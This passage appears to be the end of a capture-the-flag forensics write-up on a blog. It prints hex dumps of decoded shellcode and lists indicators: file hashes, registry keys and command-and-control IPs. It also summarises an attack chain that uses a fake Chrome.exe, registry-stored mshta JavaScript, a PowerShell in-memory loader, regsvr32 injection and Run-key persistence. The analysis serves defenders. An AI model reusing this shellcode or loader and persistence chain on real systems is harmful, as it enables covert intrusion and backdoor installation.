<span class="mf">876</span><span class="nx">f</span><span class="w"> </span><span class="mf">3512</span><span class="w"> </span><span class="mf">1670</span><span class="w"> </span><span class="mf">4655</span><span class="w"> </span><span class="nx">a241</span><span class="w"> </span><span class="nx">cd3a</span><span class="w"> </span><span class="mf">555</span><span class="nx">e</span><span class="w"> </span><span class="mo">047</span><span class="nx">f</span>
<span class="nx">a914</span><span class="w"> </span><span class="mo">052</span><span class="mf">9</span><span class="w"> </span><span class="mf">0</span><span class="nx">bed</span><span class="w"> </span><span class="nx">ec40</span><span class="w"> </span><span class="mf">368</span><span class="nx">c</span><span class="w"> </span><span class="mf">0</span><span class="nx">ebf</span><span class="w"> </span><span class="mo">012</span><span class="nx">c</span><span class="w"> </span><span class="mf">3417</span>
<span class="nx">ae34</span><span class="w"> </span><span class="nx">c96d</span><span class="w"> </span><span class="mf">4</span><span class="nx">ec3</span><span class="w"> </span><span class="nx">d104</span><span class="w"> </span><span class="mf">4</span><span class="nx">b8f</span><span class="w"> </span><span class="mf">55</span><span class="nx">f5</span><span class="w"> </span><span class="mf">2180</span><span class="w"> </span><span class="mf">33</span><span class="nx">f9</span>
<span class="mf">9</span><span class="nx">c1f</span><span class="w"> </span><span class="mf">4</span><span class="nx">d23</span><span class="w"> </span><span class="nx">e175</span><span class="w"> </span><span class="mf">2</span><span class="nx">ebe</span><span class="w"> </span><span class="mf">7</span><span class="nx">a56</span><span class="w"> </span><span class="mf">9e23</span><span class="w"> </span><span class="nx">a3b1</span><span class="w"> </span><span class="mf">85</span><span class="nx">c0</span>
<span class="nx">cbd2</span><span class="w"> </span><span class="mf">6550</span><span class="w"> </span><span class="mf">6764</span><span class="w"> </span><span class="mf">2306</span><span class="w"> </span><span class="mo">042</span><span class="nx">f</span><span class="w"> </span><span class="nx">fcd5</span><span class="w"> </span><span class="nx">dc86</span><span class="w"> </span><span class="mf">4475</span>
<span class="mf">5</span><span class="nx">b7f</span><span class="w"> </span><span class="mf">27</span><span class="nx">ed</span><span class="w"> </span><span class="nx">dc25</span><span class="w"> </span><span class="nx">f4b4</span><span class="w"> </span><span class="mf">9293</span><span class="w"> </span><span class="mf">8321</span><span class="w"> </span><span class="mf">3e6</span><span class="nx">e</span><span class="w"> </span><span class="mf">0</span><span class="nx">dca</span>
<span class="nx">b125</span><span class="w"> </span><span class="mf">8424</span><span class="w"> </span><span class="mf">47</span><span class="nx">f0</span><span class="w"> </span><span class="mf">6537</span><span class="w"> </span><span class="nx">c861</span><span class="w"> </span><span class="nx">d9c4</span><span class="w"> </span><span class="mf">620</span><span class="nx">f</span><span class="w"> </span><span class="nx">ee1a</span>
<span class="nx">fa84</span><span class="w"> </span><span class="mf">693</span><span class="nx">e</span><span class="w"> </span><span class="nx">c556</span><span class="w"> </span><span class="nx">f38e</span><span class="w"> </span><span class="mf">472</span><span class="nx">c</span><span class="w"> </span><span class="mf">6</span><span class="nx">d81</span><span class="w"> </span><span class="nx">d7fe</span><span class="w"> </span><span class="mf">2236</span>
<span class="mf">6</span><span class="nx">ba6</span><span class="w"> </span><span class="nx">a3f5</span><span class="w"> </span><span class="nx">b67f</span><span class="w"> </span><span class="mf">2</span><span class="nx">c</span>
</code></pre></div>
</li>
<li>
<p>Emulation-decoded shellcode: /tmp/recovered_flag/orhmkbye_sc32_decoded.bin</p>
<div class="highlight"><pre><span></span><code><span class="nx">dac1</span><span class="w"> </span><span class="nx">bae6</span><span class="w"> </span><span class="mf">64</span><span class="nx">fa</span><span class="w"> </span><span class="mf">72</span><span class="nx">d9</span><span class="w"> </span><span class="mf">7424</span><span class="w"> </span><span class="nx">f458</span><span class="w"> </span><span class="mf">2</span><span class="nx">bc9</span><span class="w"> </span><span class="nx">b158</span>
<span class="mf">3150</span><span class="w"> </span><span class="mf">1783</span><span class="w"> </span><span class="nx">e8fc</span><span class="w"> </span><span class="mo">0350</span><span class="w"> </span><span class="mf">13e2</span><span class="w"> </span><span class="nx">f5fc</span><span class="w"> </span><span class="mf">4883</span><span class="w"> </span><span class="nx">e4f0</span>
<span class="nx">e8c0</span><span class="w"> </span><span class="mo">0000</span><span class="w"> </span><span class="mo">0041</span><span class="w"> </span><span class="mf">5141</span><span class="w"> </span><span class="mf">5052</span><span class="w"> </span><span class="mf">5156</span><span class="w"> </span><span class="mf">4831</span><span class="w"> </span><span class="nx">d265</span>
<span class="mf">488</span><span class="nx">b</span><span class="w"> </span><span class="mf">5260</span><span class="w"> </span><span class="mf">488</span><span class="nx">b</span><span class="w"> </span><span class="mf">5218</span><span class="w"> </span><span class="mf">488</span><span class="nx">b</span><span class="w"> </span><span class="mf">5220</span><span class="w"> </span><span class="mf">488</span><span class="nx">b</span><span class="w"> </span><span class="mf">7250</span>
<span class="mf">480</span><span class="nx">f</span><span class="w"> </span><span class="nx">b74a</span><span class="w"> </span><span class="mf">4</span><span class="nx">a4d</span><span class="w"> </span><span class="mf">31</span><span class="nx">c9</span><span class="w"> </span><span class="mf">4831</span><span class="w"> </span><span class="nx">c0ac</span><span class="w"> </span><span class="mf">3</span><span class="nx">c61</span><span class="w"> </span><span class="mf">7</span><span class="nx">c02</span>
<span class="mf">2</span><span class="nx">c20</span><span class="w"> </span><span class="mf">41</span><span class="nx">c1</span><span class="w"> </span><span class="nx">c90d</span><span class="w"> </span><span class="mf">4101</span><span class="w"> </span><span class="nx">c1e2</span><span class="w"> </span><span class="nx">ed52</span><span class="w"> </span><span class="mf">4151</span><span class="w"> </span><span class="mf">488</span><span class="nx">b</span>
<span class="mf">5220</span><span class="w"> </span><span class="mf">8</span><span class="nx">b42</span><span class="w"> </span><span class="mf">3</span><span class="nx">c48</span><span class="w"> </span><span class="mo">01</span><span class="nx">d0</span><span class="w"> </span><span class="mf">8</span><span class="nx">b80</span><span class="w"> </span><span class="mf">8800</span><span class="w"> </span><span class="mo">0000</span><span class="w"> </span><span class="mf">4885</span>
<span class="nx">c074</span><span class="w"> </span><span class="mf">6748</span><span class="w"> </span><span class="mo">01</span><span class="nx">d0</span><span class="w"> </span><span class="mf">508</span><span class="nx">b</span><span class="w"> </span><span class="mf">4818</span><span class="w"> </span><span class="mf">448</span><span class="nx">b</span><span class="w"> </span><span class="mf">4020</span><span class="w"> </span><span class="mf">4901</span>
<span class="nx">d0e3</span><span class="w"> </span><span class="mf">5648</span><span class="w"> </span><span class="nx">ffc9</span><span class="w"> </span><span class="mf">418</span><span class="nx">b</span><span class="w"> </span><span class="mf">3488</span><span class="w"> </span><span class="mf">4801</span><span class="w"> </span><span class="nx">d64d</span><span class="w"> </span><span class="mf">31</span><span class="nx">c9</span>
<span class="mf">4831</span><span class="w"> </span><span class="nx">c0ac</span><span class="w"> </span><span class="mf">41</span><span class="nx">c1</span><span class="w"> </span><span class="nx">c90d</span><span class="w"> </span><span class="mf">4101</span><span class="w"> </span><span class="nx">c138</span><span class="w"> </span><span class="nx">e075</span><span class="w"> </span><span class="nx">f14c</span>
<span class="mo">034</span><span class="nx">c</span><span class="w"> </span><span class="mf">2408</span><span class="w"> </span><span class="mf">4539</span><span class="w"> </span><span class="nx">d175</span><span class="w"> </span><span class="nx">d858</span><span class="w"> </span><span class="mf">448</span><span class="nx">b</span><span class="w"> </span><span class="mf">4024</span><span class="w"> </span><span class="mf">4901</span>
<span class="nx">d066</span><span class="w"> </span><span class="mf">418</span><span class="nx">b</span><span class="w"> </span><span class="mf">0</span><span class="nx">c48</span><span class="w"> </span><span class="mf">448</span><span class="nx">b</span><span class="w"> </span><span class="mf">401</span><span class="nx">c</span><span class="w"> </span><span class="mf">4901</span><span class="w"> </span><span class="nx">d041</span><span class="w"> </span><span class="mf">8</span><span class="nx">b04</span>
<span class="mf">8848</span><span class="w"> </span><span class="mo">01</span><span class="nx">d0</span><span class="w"> </span><span class="mf">4158</span><span class="w"> </span><span class="mf">4158</span><span class="w"> </span><span class="mf">5e59</span><span class="w"> </span><span class="mf">5</span><span class="nx">a41</span><span class="w"> </span><span class="mf">5841</span><span class="w"> </span><span class="mf">5941</span>
<span class="mf">5</span><span class="nx">a48</span><span class="w"> </span><span class="mf">83</span><span class="nx">ec</span><span class="w"> </span><span class="mf">2041</span><span class="w"> </span><span class="mf">52</span><span class="nx">ff</span><span class="w"> </span><span class="nx">e058</span><span class="w"> </span><span class="mf">4159</span><span class="w"> </span><span class="mf">5</span><span class="nx">a48</span><span class="w"> </span><span class="mf">8</span><span class="nx">b12</span>
<span class="nx">e957</span><span class="w"> </span><span class="nx">ffff</span><span class="w"> </span><span class="nx">ff5d</span><span class="w"> </span><span class="mf">48</span><span class="nx">ba</span><span class="w"> </span><span class="mo">0100</span><span class="w"> </span><span class="mo">0000</span><span class="w"> </span><span class="mo">0000</span><span class="w"> </span><span class="mo">0000</span>
<span class="mf">488</span><span class="nx">d</span><span class="w"> </span><span class="mf">8</span><span class="nx">d01</span><span class="w"> </span><span class="mo">0100</span><span class="w"> </span><span class="mo">0041</span><span class="w"> </span><span class="nx">ba31</span><span class="w"> </span><span class="mf">8</span><span class="nx">b6f</span><span class="w"> </span><span class="mf">87</span><span class="nx">ff</span><span class="w"> </span><span class="nx">d5bb</span>
<span class="nx">f0b5</span><span class="w"> </span><span class="nx">a256</span><span class="w"> </span><span class="mf">41</span><span class="nx">ba</span><span class="w"> </span><span class="nx">a695</span><span class="w"> </span><span class="nx">bd9d</span><span class="w"> </span><span class="nx">ffd5</span><span class="w"> </span><span class="mf">4883</span><span class="w"> </span><span class="nx">c428</span>
<span class="mf">3</span><span class="nx">c06</span><span class="w"> </span><span class="mf">7</span><span class="nx">c0a</span><span class="w"> </span><span class="mf">80</span><span class="nx">fb</span><span class="w"> </span><span class="nx">e075</span><span class="w"> </span><span class="mo">05</span><span class="nx">bb</span><span class="w"> </span><span class="mf">4713</span><span class="w"> </span><span class="mf">726</span><span class="nx">f</span><span class="w"> </span><span class="mf">6</span><span class="nx">a00</span>
<span class="mf">5941</span><span class="w"> </span><span class="mf">89</span><span class="nx">da</span><span class="w"> </span><span class="nx">ffd5</span><span class="w"> </span><span class="mf">636</span><span class="nx">d</span><span class="w"> </span><span class="mf">6420</span><span class="w"> </span><span class="mf">2</span><span class="nx">f63</span><span class="w"> </span><span class="mf">2027</span><span class="w"> </span><span class="mf">6563</span>
<span class="mf">686</span><span class="nx">f</span><span class="w"> </span><span class="mf">2056</span><span class="w"> </span><span class="mf">6</span><span class="nx">b49</span><span class="w"> </span><span class="mf">455</span><span class="nx">a</span><span class="w"> </span><span class="mf">7359</span><span class="w"> </span><span class="mf">5763</span><span class="w"> </span><span class="mf">3649</span><span class="w"> </span><span class="mf">466</span><span class="nx">c</span>
<span class="mf">7</span><span class="nx">a66</span><span class="w"> </span><span class="mf">6e68</span><span class="w"> </span><span class="mf">475</span><span class="nx">a</span><span class="w"> </span><span class="mf">4359</span><span class="w"> </span><span class="mf">704</span><span class="nx">a</span><span class="w"> </span><span class="mf">7967</span><span class="w"> </span><span class="mf">6</span><span class="nx">d4a</span><span class="w"> </span><span class="mf">7967</span>
<span class="mf">714</span><span class="nx">b</span><span class="w"> </span><span class="mf">6930</span><span class="w"> </span><span class="mf">754</span><span class="nx">a</span><span class="w"> </span><span class="mf">3373</span><span class="w"> </span><span class="mf">6</span><span class="nx">f65</span><span class="w"> </span><span class="mf">5373</span><span class="w"> </span><span class="mf">7465</span><span class="w"> </span><span class="mf">3330</span>
<span class="mf">714</span><span class="nx">b</span><span class="w"> </span><span class="mf">7964</span><span class="w"> </span><span class="mf">394</span><span class="nx">c</span><span class="w"> </span><span class="mf">7930</span><span class="w"> </span><span class="mf">724</span><span class="nx">b</span><span class="w"> </span><span class="mf">6e6</span><span class="nx">f</span><span class="w"> </span><span class="mf">704</span><span class="nx">c</span><span class="w"> </span><span class="mf">536</span><span class="nx">b</span>
<span class="mf">7359</span><span class="w"> </span><span class="mf">673</span><span class="nx">d</span><span class="w"> </span><span class="mf">3</span><span class="nx">d27</span><span class="w"> </span><span class="mo">00</span>
</code></pre></div>
</li>
<li>
<p>Intermediate transformed bytes: /tmp/recovered_flag/flag_transform.bin</p>
</li>
<li>Token file: /tmp/recovered_flag/flag_token.txt</li>
</ol>
</li>
<li>
<p>IOC list</p>
<p>File hashes:</p>
<ul>
<li>C:\Users\FlagYard\Desktop\Chrome.exe SHA256
8655D2CBB9CDA288943B6C3DEEBD694CB92A9236A80555E6CC425D551C55FEE3 (from Sysmon)</li>
<li>815624.bat (/C/Users/FlagYard/AppData/Local/
ce3f5d/815624.bat) SHA256 1554002ed3d543c0cfe2cf336f4c04f5924d3d15077ef2a5d5971c0444b6e0db</li>
<li>dcf991.9f2207a (/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a) SHA256 60f248283b2939ce08ada1c94026dc668aecab8547398641af59148e65f8dd7c</li>
<li>Decoded Shikata shellcode SHA256
168b2d2ecdf53359f6d0c09a7108a31f60ecc9c0005e8d1c84a4d7b6545f6789</li>
<li>Final PE payload SHA256
0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li>
</ul>
<p>Registry IOCs:</p>
<ul>
<li>HKCU\software\99qzf2N\hDF82oB</li>
<li>HKCU\software\99qzf2N\WmmbDZ</li>
<li>HKCU\software\lirs\orhmkbye</li>
<li>HKCU\Software\Microsoft\Windows\CurrentVersion\Run (value:C:\Users\FlagYard\AppData\Local\ce3f5d[815624.ba](http://815624.ba/)t)</li>
<li>HKU\<sid>_Classes\bfcf36\shell\open\command
(mshta JS launcher)</sid></li>
</ul>
<p>Network IOCs observed (regsvr32 connections):</p>
<ul>
<li>13.224.161.254</li>
<li>117.135.215.187</li>
<li>185.139.2.168</li>
<li>162.243.38.153</li>
<li>154.221.98.239</li>
</ul>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../media/shikata4.png" data-desc-position="bottom"><img alt="Screenshot 2026-02-28 202731.png" src="../media/shikata4.png"></a></p>
<hr>
<h2 id="summary">Summary<a class="headerlink" href="#summary" title="Permanent link">¶</a></h2>
<p>Attack Chain</p>
<ul>
<li>Initial execution was user-launched <code>Chrome.exe](C/Users/FlagYard/Desktop/Chrome.exe</code> from Desktop at 2025-06-0311:50:34.836 (from Sysmon), masquerading asPDF-XChange Viewer SHA256:8655d2cbb9cda288943b6c3deebd694cb92a9236a80555e6cc425d551c55fee3).</li>
<li>Very shortly after, mshta.exe was launched with inline JS that reads and evals registry JS from HKCU\software\99qzf2N\hDF82oB (seen in <a href="https://www.notion.so/tmp/sysmon_u16.txt">sysmon_u16.txt</a> around 11:50:35.894).</li>
<li>mshta.exe then launched PowerShell (iex $env:zpztyd) to run in-memory shellcode loaders (see <a href="/tmp/decoded_stage2.js">decoded_stage2.js</a> and <a href="/tmp/stage3.ps1">stage3.ps1</a>).</li>
<li>Later, Chrome.exe injected into regsvr32.exe (2025-06-03 11:53:35.699), and regsvr32.exe performed the persistence setup and follow-on execution.</li>
</ul>
<p>Persistence</p>
<ul>
<li>Run key persistence:<ul>
<li>HKU\...\Software\Microsoft\Windows\CurrentVersion\Run\ -&gt; "C:\Users\FlagYard\AppData\Local\ce3f5d\815624.bat"</li>
</ul>
</li>
<li>Secondary trigger key:<ul>
<li>HKU\...\_Classes\bfcf36\shell\open\command\(Default) -&gt; mshta JS that reads HKCU\software\lirs\orhmkbye</li>
</ul>
</li>
<li>On-disk launcher:<ul>
<li>[815624.bat]<code>/C/Users/FlagYard/AppData/Local/ce3f5d/815624.bat"</code> runs[dcf991.9f2207a]<code>/C/Users/FlagYard/AppData/Local/ce3f5d/dcf991.9f2207a</code>.</li>
</ul>
</li>
</ul>
<p>Final Payload (What It Does)</p>
<ul>
<li>Final stage is registry-resident in HKCU\Software\99qzf2N\WmmbDZ (very large value).</li>
<li>The 2908-byte shellcode (from PowerShell Operational logs) resolves RegOpenKeyExA/RegQueryValueExA, reads WmmbDZ, RC4-decrypts it, and reflectively loads a PE in memory.</li>
<li>I decrypted it successfully from artifact
bytes:<ul>
<li>Output PE: /tmp/final_payload.bin</li>
<li>SHA256:
0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li>
<li>PE32, ~438 KB</li>
</ul>
</li>
<li>Behavior from payload strings/capabilities: dynamic API resolution, WinSock/network (connect, gethostbyname), HTTP POST + browser-like User-Agent strings, and in-memory execution flow (consistent with backdoor/downloader behavior, not just a one-shot dropper).</li>
</ul>
<p>IOCs</p>
<ul>
<li>
<p>Files/hashes:</p>
<ul>
<li>[hDF82oB] SHA256:
7f3b68e6d921f29cb721fc9aceb051178e7aa37d29ab761c85358dbd11121f72</li>
<li><a href="/C/Users/FlagYard/AppData/
Local/ce3f5d/815624.bat">815624.bat</a> SHA256:
1554002ed3d543c0cfe2cf336f4c04f5924d3d15077ef2a5d5971c0444b6e0db</li>
<li><a href="/C/Users/FlagYard/AppData/
Local/ce3f5d/dcf991.9f2207a">dcf991.9f2207a</a> SHA256:
60f248283b2939ce08ada1c94026dc668aecab8547398641af59148e65f8dd7c</li>
<li>/tmp/final_payload.bin SHA256:
0bb6bc10310104bfa17a241cf3548c29f55b55434b455b0196b6ce9e590ebc02</li>
</ul>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../media/shikata1.png" data-desc-position="bottom"><img alt="image.png" src="../media/shikata1.png"></a></p>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../media/shikata2.png" data-desc-position="bottom"><img alt="image.png" src="../media/shikata2.png"></a></p>
<p><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="../media/shikata3.png" data-desc-position="bottom"><img alt="image.png" src="../media/shikata3.png"></a></p>
</li>
<li>
<p>Registry:</p>
<ul>
<li>HKCU\Software\99qzf2N\hDF82oB</li>
<li>HKCU\Software\99qzf2N\WmmbDZ</li>
<li>HKCU\Software\lirs\orhmkbye</li>
<li>HKU\...\_Classes\bfcf36\shell\open\
\command\(Default)</li>
<li>HKU\...\Software\Microsoft\Windows\
\CurrentVersion\Run\</li>
</ul>
</li>
<li>Process chain:<ul>
<li>Chrome.exe -&gt; mshta.exe -&gt; powershell.exe</li>
<li>Chrome.exe -&gt; injects regsvr32.exe</li>
</ul>
</li>
<li>C2/egress IPs observed from regsvr32.exe:<ul>
<li>13.224.161.254</li>
<li>117.135.215.187</li>
<li>185.139.2.168</li>
<li>162.243.38.153</li>
<li>154.221.98.239</li>
</ul>
</li>
</ul>
<p>The shellcode decodes to a windows/x64/exec stub that runs:</p>
<p>cmd /c 'echo VkIEZsYWc6IFlzfnhGZCYpJygmJygqKi0uJ3soeSste30qKyd9Ly0rKnopLSksYg=='</p>
</li>
</ul>
<div class="document-dates-plugin-wrapper document-dates-bottom"><div class="document-dates-plugin" locale="en"><div class="dd-left"><span class="dd-item" data-tippy-content data-tippy-raw="2026-02-28"><span class="material-icons" data-icon="doc_created"></span><time datetime="2026-02-28T20:23:36-05:00">2026-02-28 20:23:36</time></span><span class="dd-item" data-tippy-content data-tippy-raw="2026-03-01"><span class="material-icons" data-icon="doc_updated"></span><time datetime="2026-03-01T01:23:36+00:00">2026-03-01 01:23:36</time></span></div><div class="dd-right"><span class="material-icons" data-icon="doc_author"></span><div class="author-group"><div class="avatar-wrapper" data-name="dhicosatria" data-tippy-content data-tippy-raw="&lt;a href=&quot;mailto:dhicosatria77@gmail.com&quot;&gt;dhicosatria&lt;/a&gt;"><span class="avatar-text"></span><a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="" data-desc-position="bottom"><img class="avatar" data-src="" data-email="dhicosatria77@gmail.com"></a></div></div></div></div></div>







  
  






                
              </article>
            </div>
          
          
  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>

<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"></path></svg>
  Back to top
</button>
        
      </main>
      
        
  <h2 id="__comments">Comments</h2>
  <script src="https://giscus.app/client.js" data-repo="dhicosatria/dhicosatria.github.io" data-repo-id="R_kgDOQykWGw" data-category="General" data-category-id="DIC_kwDOQykWG84C3beV" data-mapping="pathname" data-strict="0" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="preferred_color_scheme" data-lang="en" crossorigin="anonymous" async>
  </script>
  <!-- Synchronize Giscus theme with palette -->
  <script>
    var giscus = document.querySelector("script[src*=giscus]")

    // Set palette on initial load
    var palette = __md_get("__palette")
    if (palette && typeof palette.color === "object") {
      var theme = palette.color.scheme === "slate"
        ? "transparent_dark"
        : "light"

      // Instruct Giscus to set theme
      giscus.setAttribute("data-theme", theme) 
    }

    // Register event handlers after documented loaded
    document.addEventListener("DOMContentLoaded", function() {
      var ref = document.querySelector("[data-md-component=palette]")
      ref.addEventListener("change", function() {
        var palette = __md_get("__palette")
        if (palette && typeof palette.color === "object") {
          var theme = palette.color.scheme === "slate"
            ? "transparent_dark"
            : "light"

          // Instruct Giscus to change theme
          var frame = document.querySelector(".giscus-frame")
          frame.contentWindow.postMessage(
            { giscus: { setConfig: { theme } } },
            "https://giscus.app"
          )
        }
      })
    })
  </script>

      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      
      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.tabs", "navigation.prune", "navigation.path", "navigation.sections", "navigation.top", "content.code.copy", "content.tabs.link", "content.action.edit", "content.action.view", "content.action.revision", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link", "content.tooltips"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../../assets/javascripts/bundle.79ae519e.min.js"></script>
      
        <script src="../../../assets/document_dates/tippy/popper.min.js"></script>
      
        <script src="../../../assets/document_dates/tippy/tippy.umd.min.js"></script>
      
        <script src="../../../assets/document_dates/core/md5.min.js"></script>
      
        <script src="../../../assets/document_dates/core/default.config.js"></script>
      
        <script src="../../../assets/document_dates/user.config.js"></script>
      
        <script src="../../../assets/document_dates/core/utils.js"></script>
      
        <script src="../../../assets/document_dates/core/core.js"></script>
      
    
  
<script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(()=>{ lightbox.reload(); });
</script></body></html>